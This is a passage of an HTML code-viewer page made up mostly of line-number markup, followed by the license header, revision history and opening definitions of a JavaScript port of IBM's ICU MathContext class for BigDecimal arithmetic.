class="line">4912</span><br><span class="line">4913</span><br><span class="line">4914</span><br><span class="line">4915</span><br><span class="line">4916</span><br><span class="line">4917</span><br><span class="line">4918</span><br><span class="line">4919</span><br><span class="line">4920</span><br><span class="line">4921</span><br><span class="line">4922</span><br><span class="line">4923</span><br><span class="line">4924</span><br><span class="line">4925</span><br><span class="line">4926</span><br><span class="line">4927</span><br><span class="line">4928</span><br><span class="line">4929</span><br><span class="line">4930</span><br><span class="line">4931</span><br><span class="line">4932</span><br><span class="line">4933</span><br><span class="line">4934</span><br><span class="line">4935</span><br><span class="line">4936</span><br><span class="line">4937</span><br><span class="line">4938</span><br><span class="line">4939</span><br><span class="line">4940</span><br><span class="line">4941</span><br><span class="line">4942</span><br><span class="line">4943</span><br><span class="line">4944</span><br><span class="line">4945</span><br><span class="line">4946</span><br><span class="line">4947</span><br><span class="line">4948</span><br><span class="line">4949</span><br><span class="line">4950</span><br><span class="line">4951</span><br><span class="line">4952</span><br><span class="line">4953</span><br><span class="line">4954</span><br><span class="line">4955</span><br><span class="line">4956</span><br><span class="line">4957</span><br><span class="line">4958</span><br><span class="line">4959</span><br><span class="line">4960</span><br><span class="line">4961</span><br><span class="line">4962</span><br><span class="line">4963</span><br><span class="line">4964</span><br><span class="line">4965</span><br><span class="line">4966</span><br><span class="line">4967</span><br><span class="line">4968</span><br><span class="line">4969</span><br><span class="line">4970</span><br><span class="line">4971</span><br><span class="line">4972</span><br><span class="line">4973</span><br><span class="line">4974</span><br><span class="line">4975</span><br><span class="line">4976</span><br><span class="line">4977</span><br><span class="line">4978</span><br><span class="line">4979</span><br><span class="line">4980</span><br><span class="line">4981</span><br><span class="line">4982</span><br><span class="line">4983</span><br><span class="line">4984</span><br><span class="line">4985</span><br><span class="line">4986</span><br><span class="line">4987</span><br><span class="line">4988</span><br><span class="line">4989</span><br><span class="line">4990</span><br><span class="line">4991</span><br><span class="line">4992</span><br><span class="line">4993</span><br><span class="line">4994</span><br><span class="line">4995</span><br><span class="line">4996</span><br><span class="line">4997</span><br><span class="line">4998</span><br><span class="line">4999</span><br><span class="line">5000</span><br><span class="line">5001</span><br><span class="line">5002</span><br><span class="line">5003</span><br><span class="line">5004</span><br><span class="line">5005</span><br><span class="line">5006</span><br><span class="line">5007</span><br><span class="line">5008</span><br><span class="line">5009</span><br><span class="line">5010</span><br><span class="line">5011</span><br><span class="line">5012</span><br><span class="line">5013</span><br><span class="line">5014</span><br><span class="line">5015</span><br><span class="line">5016</span><br><span class="line">5017</span><br><span class="line">5018</span><br><span class="line">5019</span><br><span class="line">5020</span><br><span class="line">5021</span><br><span class="line">5022</span><br><span class="line">5023</span><br><span class="line">5024</span><br><span class="line">5025</span><br><span class="line">5026</span><br><span class="line">5027</span><br><span class="line">5028</span><br><span class="line">5029</span><br><span class="line">5030</span><br><span class="line">5031</span><br><span class="line">5032</span><br><span class="line">5033</span><br><span class="line">5034</span><br><span class="line">5035</span><br><span class="line">5036</span><br><span class="line">5037</span><br><span class="line">5038</span><br><span class="line">5039</span><br><span class="line">5040</span><br><span class="line">5041</span><br><span class="line">5042</span><br><span class="line">5043</span><br><span class="line">5044</span><br><span class="line">5045</span><br><span class="line">5046</span><br><span class="line">5047</span><br><span class="line">5048</span><br><span class="line">5049</span><br><span class="line">5050</span><br><span class="line">5051</span><br><span class="line">5052</span><br><span class="line">5053</span><br><span class="line">5054</span><br><span class="line">5055</span><br><span class="line">5056</span><br><span class="line">5057</span><br><span class="line">5058</span><br><span class="line">5059</span><br><span class="line">5060</span><br><span class="line">5061</span><br><span class="line">5062</span><br><span class="line">5063</span><br><span class="line">5064</span><br><span class="line">5065</span><br><span class="line">5066</span><br><span class="line">5067</span><br><span class="line">5068</span><br><span class="line">5069</span><br><span class="line">5070</span><br><span class="line">5071</span><br><span class="line">5072</span><br><span class="line">5073</span><br><span class="line">5074</span><br><span class="line">5075</span><br><span class="line">5076</span><br><span class="line">5077</span><br><span class="line">5078</span><br><span class="line">5079</span><br><span class="line">5080</span><br><span class="line">5081</span><br><span class="line">5082</span><br><span class="line">5083</span><br><span class="line">5084</span><br><span class="line">5085</span><br><span class="line">5086</span><br><span class="line">5087</span><br><span class="line">5088</span><br><span class="line">5089</span><br><span class="line">5090</span><br><span class="line">5091</span><br><span class="line">5092</span><br><span class="line">5093</span><br><span class="line">5094</span><br><span class="line">5095</span><br><span class="line">5096</span><br><span class="line">5097</span><br><span class="line">5098</span><br><span class="line">5099</span><br><span class="line">5100</span><br><span class="line">5101</span><br><span class="line">5102</span><br><span class="line">5103</span><br><span class="line">5104</span><br><span class="line">5105</span><br><span class="line">5106</span><br><span class="line">5107</span><br><span class="line">5108</span><br><span class="line">5109</span><br><span class="line">5110</span><br><span class="line">5111</span><br><span class="line">5112</span><br><span class="line">5113</span><br><span class="line">5114</span><br><span class="line">5115</span><br><span class="line">5116</span><br><span class="line">5117</span><br><span class="line">5118</span><br><span class="line">5119</span><br><span class="line">5120</span><br><span class="line">5121</span><br><span class="line">5122</span><br><span class="line">5123</span><br><span class="line">5124</span><br><span class="line">5125</span><br><span class="line">5126</span><br><span class="line">5127</span><br><span class="line">5128</span><br><span class="line">5129</span><br><span class="line">5130</span><br><span class="line">5131</span><br><span class="line">5132</span><br><span class="line">5133</span><br><span class="line">5134</span><br><span class="line">5135</span><br><span class="line">5136</span><br><span class="line">5137</span><br><span class="line">5138</span><br><span class="line">5139</span><br><span class="line">5140</span><br><span class="line">5141</span><br><span class="line">5142</span><br><span class="line">5143</span><br><span class="line">5144</span><br><span class="line">5145</span><br><span class="line">5146</span><br><span class="line">5147</span><br><span class="line">5148</span><br><span class="line">5149</span><br><span class="line">5150</span><br><span class="line">5151</span><br><span class="line">5152</span><br><span class="line">5153</span><br><span class="line">5154</span><br><span class="line">5155</span><br><span class="line">5156</span><br><span class="line">5157</span><br><span class="line">5158</span><br><span class="line">5159</span><br><span class="line">5160</span><br><span class="line">5161</span><br><span class="line">5162</span><br><span class="line">5163</span><br><span class="line">5164</span><br><span class="line">5165</span><br><span class="line">5166</span><br><span class="line">5167</span><br><span class="line">5168</span><br><span class="line">5169</span><br><span class="line">5170</span><br><span class="line">5171</span><br><span class="line">5172</span><br><span class="line">5173</span><br><span class="line">5174</span><br><span class="line">5175</span><br><span class="line">5176</span><br><span class="line">5177</span><br><span class="line">5178</span><br><span class="line">5179</span><br><span class="line">5180</span><br><span class="line">5181</span><br><span class="line">5182</span><br><span class="line">5183</span><br><span class="line">5184</span><br><span class="line">5185</span><br><span class="line">5186</span><br><span class="line">5187</span><br><span class="line">5188</span><br><span class="line">5189</span><br><span class="line">5190</span><br><span class="line">5191</span><br><span class="line">5192</span><br><span class="line">5193</span><br><span class="line">5194</span><br><span class="line">5195</span><br><span class="line">5196</span><br><span class="line">5197</span><br><span class="line">5198</span><br><span class="line">5199</span><br><span class="line">5200</span><br><span class="line">5201</span><br><span class="line">5202</span><br><span class="line">5203</span><br><span class="line">5204</span><br><span class="line">5205</span><br><span class="line">5206</span><br><span class="line">5207</span><br><span class="line">5208</span><br><span class="line">5209</span><br><span class="line">5210</span><br><span class="line">5211</span><br><span class="line">5212</span><br><span class="line">5213</span><br><span class="line">5214</span><br><span class="line">5215</span><br><span class="line">5216</span><br><span class="line">5217</span><br><span class="line">5218</span><br><span class="line">5219</span><br><span class="line">5220</span><br><span class="line">5221</span><br><span class="line">5222</span><br><span class="line">5223</span><br><span class="line">5224</span><br><span class="line">5225</span><br><span class="line">5226</span><br><span class="line">5227</span><br><span class="line">5228</span><br><span class="line">5229</span><br><span class="line">5230</span><br><span class="line">5231</span><br><span class="line">5232</span><br><span class="line">5233</span><br><span class="line">5234</span><br><span class="line">5235</span><br><span class="line">5236</span><br><span class="line">5237</span><br><span class="line">5238</span><br><span class="line">5239</span><br><span class="line">5240</span><br><span class="line">5241</span><br><span class="line">5242</span><br><span class="line">5243</span><br><span class="line">5244</span><br><span class="line">5245</span><br><span class="line">5246</span><br><span class="line">5247</span><br><span class="line">5248</span><br><span class="line">5249</span><br><span class="line">5250</span><br><span class="line">5251</span><br><span class="line">5252</span><br><span class="line">5253</span><br><span class="line">5254</span><br><span class="line">5255</span><br><span class="line">5256</span><br><span class="line">5257</span><br><span class="line">5258</span><br><span class="line">5259</span><br><span class="line">5260</span><br><span class="line">5261</span><br><span class="line">5262</span><br><span class="line">5263</span><br><span class="line">5264</span><br><span class="line">5265</span><br><span class="line">5266</span><br><span class="line">5267</span><br><span class="line">5268</span><br><span class="line">5269</span><br><span class="line">5270</span><br><span class="line">5271</span><br><span class="line">5272</span><br><span class="line">5273</span><br><span class="line">5274</span><br><span class="line">5275</span><br><span class="line">5276</span><br><span class="line">5277</span><br><span class="line">5278</span><br><span class="line">5279</span><br><span class="line">5280</span><br><span class="line">5281</span><br><span class="line">5282</span><br><span class="line">5283</span><br><span class="line">5284</span><br><span class="line">5285</span><br><span class="line">5286</span><br><span class="line">5287</span><br><span class="line">5288</span><br><span class="line">5289</span><br><span class="line">5290</span><br><span class="line">5291</span><br><span class="line">5292</span><br><span class="line">5293</span><br><span class="line">5294</span><br><span class="line">5295</span><br><span class="line">5296</span><br><span class="line">5297</span><br><span class="line">5298</span><br><span class="line">5299</span><br><span class="line">5300</span><br><span class="line">5301</span><br><span class="line">5302</span><br><span class="line">5303</span><br><span class="line">5304</span><br><span class="line">5305</span><br><span class="line">5306</span><br><span class="line">5307</span><br><span class="line">5308</span><br><span class="line">5309</span><br><span class="line">5310</span><br><span class="line">5311</span><br><span class="line">5312</span><br><span class="line">5313</span><br><span class="line">5314</span><br><span class="line">5315</span><br><span class="line">5316</span><br><span class="line">5317</span><br><span class="line">5318</span><br><span class="line">5319</span><br><span class="line">5320</span><br><span class="line">5321</span><br><span class="line">5322</span><br><span class="line">5323</span><br><span class="line">5324</span><br><span class="line">5325</span><br><span class="line">5326</span><br><span class="line">5327</span><br><span class="line">5328</span><br><span class="line">5329</span><br><span class="line">5330</span><br><span class="line">5331</span><br><span class="line">5332</span><br><span class="line">5333</span><br><span class="line">5334</span><br><span class="line">5335</span><br><span class="line">5336</span><br><span class="line">5337</span><br><span class="line">5338</span><br><span class="line">5339</span><br><span class="line">5340</span><br><span class="line">5341</span><br><span class="line">5342</span><br><span class="line">5343</span><br><span class="line">5344</span><br><span class="line">5345</span><br><span class="line">5346</span><br><span class="line">5347</span><br><span class="line">5348</span><br><span class="line">5349</span><br><span class="line">5350</span><br><span class="line">5351</span><br><span class="line">5352</span><br><span class="line">5353</span><br><span class="line">5354</span><br><span class="line">5355</span><br><span class="line">5356</span><br><span class="line">5357</span><br><span class="line">5358</span><br><span class="line">5359</span><br><span class="line">5360</span><br><span class="line">5361</span><br><span class="line">5362</span><br><span class="line">5363</span><br><span class="line">5364</span><br><span class="line">5365</span><br><span class="line">5366</span><br><span class="line">5367</span><br><span class="line">5368</span><br><span class="line">5369</span><br><span class="line">5370</span><br><span class="line">5371</span><br><span class="line">5372</span><br><span class="line">5373</span><br><span class="line">5374</span><br><span class="line">5375</span><br><span class="line">5376</span><br><span class="line">5377</span><br><span class="line">5378</span><br><span class="line">5379</span><br><span class="line">5380</span><br><span class="line">5381</span><br><span class="line">5382</span><br><span class="line">5383</span><br><span class="line">5384</span><br><span class="line">5385</span><br><span class="line">5386</span><br><span class="line">5387</span><br><span class="line">5388</span><br><span class="line">5389</span><br><span class="line">5390</span><br><span class="line">5391</span><br><span class="line">5392</span><br><span class="line">5393</span><br><span class="line">5394</span><br><span class="line">5395</span><br><span class="line">5396</span><br><span class="line">5397</span><br><span class="line">5398</span><br><span class="line">5399</span><br><span class="line">5400</span><br><span class="line">5401</span><br><span class="line">5402</span><br><span class="line">5403</span><br><span class="line">5404</span><br><span class="line">5405</span><br><span class="line">5406</span><br><span class="line">5407</span><br><span class="line">5408</span><br><span class="line">5409</span><br><span class="line">5410</span><br><span class="line">5411</span><br><span class="line">5412</span><br><span class="line">5413</span><br><span class="line">5414</span><br><span class="line">5415</span><br><span class="line">5416</span><br><span class="line">5417</span><br><span class="line">5418</span><br><span class="line">5419</span><br><span class="line">5420</span><br><span class="line">5421</span><br><span class="line">5422</span><br><span class="line">5423</span><br><span class="line">5424</span><br><span class="line">5425</span><br><span class="line">5426</span><br><span class="line">5427</span><br><span class="line">5428</span><br><span class="line">5429</span><br><span class="line">5430</span><br><span class="line">5431</span><br><span class="line">5432</span><br><span class="line">5433</span><br><span class="line">5434</span><br><span class="line">5435</span><br><span class="line">5436</span><br><span class="line">5437</span><br><span class="line">5438</span><br><span class="line">5439</span><br><span class="line">5440</span><br><span class="line">5441</span><br><span class="line">5442</span><br><span class="line">5443</span><br><span class="line">5444</span><br><span class="line">5445</span><br><span class="line">5446</span><br><span class="line">5447</span><br><span class="line">5448</span><br><span class="line">5449</span><br><span class="line">5450</span><br><span class="line">5451</span><br><span class="line">5452</span><br><span class="line">5453</span><br><span class="line">5454</span><br><span class="line">5455</span><br><span class="line">5456</span><br><span class="line">5457</span><br><span class="line">5458</span><br><span class="line">5459</span><br><span class="line">5460</span><br><span class="line">5461</span><br><span class="line">5462</span><br><span class="line">5463</span><br><span class="line">5464</span><br><span class="line">5465</span><br><span class="line">5466</span><br><span class="line">5467</span><br><span class="line">5468</span><br><span class="line">5469</span><br><span class="line">5470</span><br><span class="line">5471</span><br><span class="line">5472</span><br><span class="line">5473</span><br><span class="line">5474</span><br><span class="line">5475</span><br><span class="line">5476</span><br><span class="line">5477</span><br><span class="line">5478</span><br><span class="line">5479</span><br><span class="line">5480</span><br><span class="line">5481</span><br><span class="line">5482</span><br><span class="line">5483</span><br><span class="line">5484</span><br><span class="line">5485</span><br><span class="line">5486</span><br><span class="line">5487</span><br><span class="line">5488</span><br><span class="line">5489</span><br><span class="line">5490</span><br><span class="line">5491</span><br><span class="line">5492</span><br><span class="line">5493</span><br><span class="line">5494</span><br><span class="line">5495</span><br><span class="line">5496</span><br><span class="line">5497</span><br><span class="line">5498</span><br><span class="line">5499</span><br><span class="line">5500</span><br><span class="line">5501</span><br><span class="line">5502</span><br><span class="line">5503</span><br><span class="line">5504</span><br><span class="line">5505</span><br><span class="line">5506</span><br><span class="line">5507</span><br><span class="line">5508</span><br><span class="line">5509</span><br><span class="line">5510</span><br><span class="line">5511</span><br><span class="line">5512</span><br><span class="line">5513</span><br><span class="line">5514</span><br><span class="line">5515</span><br><span class="line">5516</span><br><span class="line">5517</span><br><span class="line">5518</span><br><span class="line">5519</span><br><span class="line">5520</span><br><span class="line">5521</span><br><span class="line">5522</span><br><span class="line">5523</span><br><span class="line">5524</span><br><span class="line">5525</span><br><span class="line">5526</span><br><span class="line">5527</span><br><span class="line">5528</span><br><span class="line">5529</span><br><span class="line">5530</span><br><span class="line">5531</span><br><span class="line">5532</span><br><span class="line">5533</span><br><span class="line">5534</span><br><span class="line">5535</span><br><span class="line">5536</span><br><span class="line">5537</span><br><span class="line">5538</span><br><span class="line">5539</span><br><span class="line">5540</span><br><span class="line">5541</span><br><span class="line">5542</span><br><span class="line">5543</span><br><span class="line">5544</span><br><span class="line">5545</span><br><span class="line">5546</span><br><span class="line">5547</span><br><span class="line">5548</span><br><span class="line">5549</span><br><span class="line">5550</span><br><span class="line">5551</span><br><span class="line">5552</span><br><span class="line">5553</span><br><span class="line">5554</span><br><span class="line">5555</span><br><span class="line">5556</span><br><span class="line">5557</span><br><span class="line">5558</span><br><span class="line">5559</span><br><span class="line">5560</span><br><span class="line">5561</span><br><span class="line">5562</span><br><span class="line">5563</span><br><span class="line">5564</span><br><span class="line">5565</span><br><span class="line">5566</span><br><span class="line">5567</span><br><span class="line">5568</span><br><span class="line">5569</span><br><span class="line">5570</span><br><span class="line">5571</span><br><span class="line">5572</span><br><span class="line">5573</span><br><span class="line">5574</span><br><span class="line">5575</span><br><span class="line">5576</span><br><span class="line">5577</span><br><span class="line">5578</span><br><span class="line">5579</span><br><span class="line">5580</span><br><span class="line">5581</span><br><span class="line">5582</span><br><span class="line">5583</span><br><span class="line">5584</span><br><span class="line">5585</span><br><span class="line">5586</span><br><span class="line">5587</span><br><span class="line">5588</span><br><span class="line">5589</span><br><span class="line">5590</span><br><span class="line">5591</span><br><span class="line">5592</span><br><span class="line">5593</span><br><span class="line">5594</span><br><span class="line">5595</span><br><span class="line">5596</span><br><span class="line">5597</span><br><span class="line">5598</span><br><span class="line">5599</span><br><span class="line">5600</span><br><span class="line">5601</span><br><span class="line">5602</span><br><span class="line">5603</span><br><span class="line">5604</span><br><span class="line">5605</span><br><span class="line">5606</span><br><span class="line">5607</span><br><span class="line">5608</span><br><span class="line">5609</span><br><span class="line">5610</span><br><span class="line">5611</span><br><span class="line">5612</span><br><span class="line">5613</span><br><span class="line">5614</span><br><span class="line">5615</span><br><span class="line">5616</span><br><span class="line">5617</span><br><span class="line">5618</span><br><span class="line">5619</span><br><span class="line">5620</span><br><span class="line">5621</span><br><span class="line">5622</span><br><span class="line">5623</span><br><span class="line">5624</span><br><span class="line">5625</span><br><span class="line">5626</span><br><span class="line">5627</span><br><span class="line">5628</span><br><span class="line">5629</span><br><span class="line">5630</span><br><span class="line">5631</span><br><span class="line">5632</span><br><span class="line">5633</span><br><span class="line">5634</span><br><span class="line">5635</span><br><span class="line">5636</span><br><span class="line">5637</span><br><span class="line">5638</span><br><span class="line">5639</span><br><span class="line">5640</span><br><span class="line">5641</span><br><span class="line">5642</span><br><span class="line">5643</span><br><span class="line">5644</span><br><span class="line">5645</span><br><span class="line">5646</span><br><span class="line">5647</span><br><span class="line">5648</span><br><span class="line">5649</span><br><span class="line">5650</span><br><span class="line">5651</span><br><span class="line">5652</span><br><span class="line">5653</span><br><span class="line">5654</span><br><span class="line">5655</span><br><span class="line">5656</span><br><span class="line">5657</span><br><span class="line">5658</span><br><span class="line">5659</span><br><span class="line">5660</span><br><span class="line">5661</span><br><span class="line">5662</span><br><span class="line">5663</span><br><span class="line">5664</span><br><span class="line">5665</span><br><span class="line">5666</span><br><span class="line">5667</span><br><span class="line">5668</span><br><span class="line">5669</span><br><span class="line">5670</span><br><span class="line">5671</span><br><span class="line">5672</span><br><span class="line">5673</span><br><span class="line">5674</span><br><span class="line">5675</span><br><span class="line">5676</span><br><span class="line">5677</span><br><span class="line">5678</span><br><span class="line">5679</span><br><span class="line">5680</span><br><span class="line">5681</span><br><span class="line">5682</span><br><span class="line">5683</span><br><span class="line">5684</span><br><span class="line">5685</span><br><span class="line">5686</span><br><span class="line">5687</span><br><span class="line">5688</span><br><span class="line">5689</span><br><span class="line">5690</span><br><span class="line">5691</span><br><span class="line">5692</span><br><span class="line">5693</span><br><span class="line">5694</span><br><span class="line">5695</span><br><span class="line">5696</span><br><span class="line">5697</span><br><span class="line">5698</span><br><span class="line">5699</span><br><span class="line">5700</span><br><span class="line">5701</span><br><span class="line">5702</span><br><span class="line">5703</span><br><span class="line">5704</span><br><span class="line">5705</span><br><span class="line">5706</span><br><span class="line">5707</span><br><span class="line">5708</span><br><span class="line">5709</span><br><span class="line">5710</span><br><span class="line">5711</span><br><span class="line">5712</span><br><span class="line">5713</span><br><span class="line">5714</span><br><span class="line">5715</span><br><span class="line">5716</span><br><span class="line">5717</span><br><span class="line">5718</span><br><span class="line">5719</span><br><span class="line">5720</span><br><span class="line">5721</span><br><span class="line">5722</span><br><span class="line">5723</span><br><span class="line">5724</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** @license Copyright (c) 2012 Daniel Trebbien and other contributors</span></span><br><span class="line"><span class="comment">Portions Copyright (c) 2003 STZ-IDA and PTV AG, Karlsruhe, Germany</span></span><br><span class="line"><span class="comment">Portions Copyright (c) 1995-2001 International Business Machines Corporation and others</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">All rights reserved.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, provided that the above copyright notice(s) and this permission notice appear in all copies of the Software and that both the above copyright notice(s) and this permission notice appear in supporting documentation.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR HOLDERS INCLUDED IN THIS NOTICE BE LIABLE FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Except as contained in this notice, the name of a copyright holder shall not be used in advertising or otherwise to promote the sale, use or other dealings in this Software without prior written authorization of the copyright holder.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> MathContext = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">/* Generated from 'MathContext.nrx' 8 Sep 2000 11:07:48 [v2.00] */</span></span><br><span class="line"><span class="comment">/* Options: Binary Comments Crossref Format Java Logo Strictargs Strictcase Trace2 Verbose3 */</span></span><br><span class="line"><span class="comment">//--package com.ibm.icu.math;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"><span class="comment">/* MathContext -- Math context settings                               */</span></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"><span class="comment">/* Copyright IBM Corporation, 1997, 2000.  All Rights Reserved.       */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/*   The MathContext object encapsulates the settings used by the     */</span></span><br><span class="line"><span class="comment">/*   BigDecimal class; it could also be used by other arithmetics.    */</span></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"><span class="comment">/* Notes:                                                             */</span></span><br><span class="line"><span class="comment">/*                                                                    */</span></span><br><span class="line"><span class="comment">/* 1. The properties are checked for validity on construction, so     */</span></span><br><span class="line"><span class="comment">/*    the BigDecimal class may assume that they are correct.          */</span></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"><span class="comment">/* Author:    Mike Cowlishaw                                          */</span></span><br><span class="line"><span class="comment">/* 1997.09.03 Initial version (edited from netrexx.lang.RexxSet)      */</span></span><br><span class="line"><span class="comment">/* 1997.09.12 Add lostDigits property                                 */</span></span><br><span class="line"><span class="comment">/* 1998.05.02 Make the class immutable and final; drop set methods    */</span></span><br><span class="line"><span class="comment">/* 1998.06.05 Add Round (rounding modes) property                     */</span></span><br><span class="line"><span class="comment">/* 1998.06.25 Rename from DecimalContext; allow digits=0              */</span></span><br><span class="line"><span class="comment">/* 1998.10.12 change to com.ibm.icu.math package                          */</span></span><br><span class="line"><span class="comment">/* 1999.02.06 add javadoc comments                                    */</span></span><br><span class="line"><span class="comment">/* 1999.03.05 simplify; changes from discussion with J. Bloch         */</span></span><br><span class="line"><span class="comment">/* 1999.03.13 1.00 release to IBM Centre for Java Technology          */</span></span><br><span class="line"><span class="comment">/* 1999.07.10 1.04 flag serialization unused                          */</span></span><br><span class="line"><span class="comment">/* 2000.01.01 1.06 copyright update                                   */</span></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* JavaScript conversion (c) 2003 STZ-IDA and PTV AG, Karlsruhe, Germany */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The &lt;code&gt;MathContext&lt;/code&gt; immutable class encapsulates the</span></span><br><span class="line"><span class="comment"> * settings understood by the operator methods of the &#123;@link BigDecimal&#125;</span></span><br><span class="line"><span class="comment"> * class (and potentially other classes).  Operator methods are those</span></span><br><span class="line"><span class="comment"> * that effect an operation on a number or a pair of numbers.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The settings, which are not base-dependent, comprise:</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&lt;code&gt;digits&lt;/code&gt;:</span></span><br><span class="line"><span class="comment"> * the number of digits (precision) to be used for an operation</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&lt;code&gt;form&lt;/code&gt;:</span></span><br><span class="line"><span class="comment"> * the form of any exponent that results from the operation</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&lt;code&gt;lostDigits&lt;/code&gt;:</span></span><br><span class="line"><span class="comment"> * whether checking for lost digits is enabled</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&lt;code&gt;roundingMode&lt;/code&gt;:</span></span><br><span class="line"><span class="comment"> * the algorithm to be used for rounding.</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * When provided, a &lt;code&gt;MathContext&lt;/code&gt; object supplies the</span></span><br><span class="line"><span class="comment"> * settings for an operation directly.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * When &lt;code&gt;MathContext.DEFAULT&lt;/code&gt; is provided for a</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;MathContext&lt;/code&gt; parameter then the default settings are used</span></span><br><span class="line"><span class="comment"> * (&lt;code&gt;9, SCIENTIFIC, false, ROUND_HALF_UP&lt;/code&gt;).</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * In the &lt;code&gt;BigDecimal&lt;/code&gt; class, all methods which accept a</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;MathContext&lt;/code&gt; object defaults) also have a version of the</span></span><br><span class="line"><span class="comment"> * method which does not accept a MathContext parameter.  These versions</span></span><br><span class="line"><span class="comment"> * carry out unlimited precision fixed point arithmetic (as though the</span></span><br><span class="line"><span class="comment"> * settings were (&lt;code&gt;0, PLAIN, false, ROUND_HALF_UP&lt;/code&gt;).</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The instance variables are shared with default access (so they are</span></span><br><span class="line"><span class="comment"> * directly accessible to the &lt;code&gt;BigDecimal&lt;/code&gt; class), but must</span></span><br><span class="line"><span class="comment"> * never be changed.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The rounding mode constants have the same names and values as the</span></span><br><span class="line"><span class="comment"> * constants of the same name in &lt;code&gt;java.math.BigDecimal&lt;/code&gt;, to</span></span><br><span class="line"><span class="comment"> * maintain compatibility with earlier versions of</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;BigDecimal&lt;/code&gt;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @see     BigDecimal</span></span><br><span class="line"><span class="comment"> * @author  Mike Cowlishaw</span></span><br><span class="line"><span class="comment"> * @stable ICU 2.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//--public final class MathContext implements java.io.Serializable&#123;</span></span><br><span class="line"> <span class="comment">//--private static final java.lang.String $0="MathContext.nrx";</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//-- methods</span></span><br><span class="line"> MathContext.prototype.getDigits = getDigits;</span><br><span class="line"> MathContext.prototype.getForm = getForm;</span><br><span class="line"> MathContext.prototype.getLostDigits = getLostDigits;</span><br><span class="line"> MathContext.prototype.getRoundingMode = getRoundingMode;</span><br><span class="line"> MathContext.prototype.toString = toString;</span><br><span class="line"> MathContext.prototype.isValidRound = isValidRound;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* ----- Properties ----- */</span></span><br><span class="line"> <span class="comment">/* properties public constant */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Plain (fixed point) notation, without any exponent.</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the form of the result of a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; operation.</span></span><br><span class="line"><span class="comment">  * A zero result in plain form may have a decimal part of one or</span></span><br><span class="line"><span class="comment">  * more zeros.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @see #ENGINEERING</span></span><br><span class="line"><span class="comment">  * @see #SCIENTIFIC</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="comment">//--public static final int PLAIN=0; // [no exponent]</span></span><br><span class="line"> MathContext.PLAIN = MathContext.prototype.PLAIN = <span class="number">0</span>; <span class="comment">// [no exponent]</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Standard floating point notation (with scientific exponential</span></span><br><span class="line"><span class="comment">  * format, where there is one digit before any decimal point).</span></span><br><span class="line"><span class="comment">  * Used as a setting to control the form of the result of a</span></span><br><span class="line"><span class="comment">  * 